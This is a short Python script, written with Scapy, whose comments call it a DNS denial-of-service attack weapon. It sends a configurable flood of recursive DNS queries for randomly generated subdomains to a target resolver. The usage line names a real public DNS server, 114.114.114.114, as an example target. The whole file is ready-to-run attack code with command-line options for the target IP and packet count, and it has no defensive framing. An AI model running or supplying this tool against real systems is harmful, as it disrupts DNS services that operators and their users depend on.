# coding=utf-8
"""
DATE:   2021/11/22
AUTHOR: TesterCC
"""
import json
import optparse

from scapy.all import *

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR

ret = dict()
ret['status'] = None


"""
DNS，基于UDP
ref: https://www.packetlevel.ch/html/scapy/scapydns.html

如何对DNS服务器进行大量DNS名称解析:
要构建一个包含随机查询字符串的DNS请求包，主要还是添加qname项。

python DNS拒绝服务攻击武器.py --ip 114.114.114.114 --count 300
"""
def start_attack(dst, count):
    top = [".com", ".net", ".com", ".edu", ".ch", ".de", ".li", ".jp", ".ru", ".tv", ".nl", ".fr"]
    anz_top = len(top)

    for i in range(0, count):
        s = str(RandString(RandNum(1, 7)))
        s1 = s.lower()
        d = str(RandString(RandNum(5, 15)))
        d1 = d.lower()
        t = top[random.randint(0, anz_top - 1)]
        t1 = t.lower()
        q = s1 + "." + d1 + t1
        # print("{} {}".format(i,q))
        send(IP(dst=dst) / UDP(sport=RandShort()) / DNS(rd=1, qd=DNSQR(qname=q)),verbose=False)

    ret['status'] = 'success'


def main():
    parser = optparse.OptionParser('usage: python %prog --ip 1.1.1.1 --count 200 \n')
    parser.add_option('-i', '--ip', dest='attack_ip', default='1.1.1.1', type='string', help='attack dns ip')
    parser.add_option('-c', '--count', dest='attack_count', default='100', type='string', help='send packet count')
    options, args = parser.parse_args()
    start_attack(options.attack_ip, int(options.attack_count))
    print(json.dumps(ret))


if __name__ == '__main__':
    main()
